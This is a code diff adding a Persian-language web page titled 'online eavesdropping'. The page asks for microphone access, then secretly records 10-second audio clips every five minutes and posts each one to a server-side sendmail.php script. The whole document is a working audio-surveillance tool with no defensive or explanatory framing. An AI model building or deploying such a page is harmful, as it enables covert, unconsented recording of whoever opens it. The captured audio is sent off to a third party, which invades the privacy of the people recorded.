@@ -1,0 +1,49 @@
+<!DOCTYPE html>
+<html lang="fa">
+<head>
+  <meta charset="UTF-8">
+  <title>شنود آنلاین</title>
+</head>
+<body>
+  <h2>برای شروع، روی دکمه کلیک کنید و اجازه میکروفون بدهید</h2>
+  <button id="startBtn">شروع شنود</button>
+
+  <script>
+    let mediaRecorder;
+    let chunks = [];
+
+    document.getElementById('startBtn').onclick = async () => {
+      const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+      mediaRecorder = new MediaRecorder(stream);
+
+      mediaRecorder.ondataavailable = function (e) {
+        if (e.data.size > 0) {
+          chunks.push(e.data);
+        }
+      };
+
+      mediaRecorder.onstop = function () {
+        const blob = new Blob(chunks, { type: 'audio/webm' });
+        const formData = new FormData();
+        formData.append('audio', blob, 'audio_' + Date.now() + '.webm');
+
+        fetch('sendmail.php', {
+          method: 'POST',
+          body: formData
+        }).then(res => console.log('ارسال شد')).catch(err => console.error(err));
+
+        chunks = [];
+      };
+
+      startRecordingCycle();
+      setInterval(startRecordingCycle, 5 * 60 * 1000); // هر ۵ دقیقه
+    };
+
+    function startRecordingCycle() {
+      if (!mediaRecorder) return;
+      mediaRecorder.start();
+      setTimeout(() => mediaRecorder.stop(), 10000); // ۱۰ ثانیه ضبط
+    }
+  </script>
+</body>
+</html>
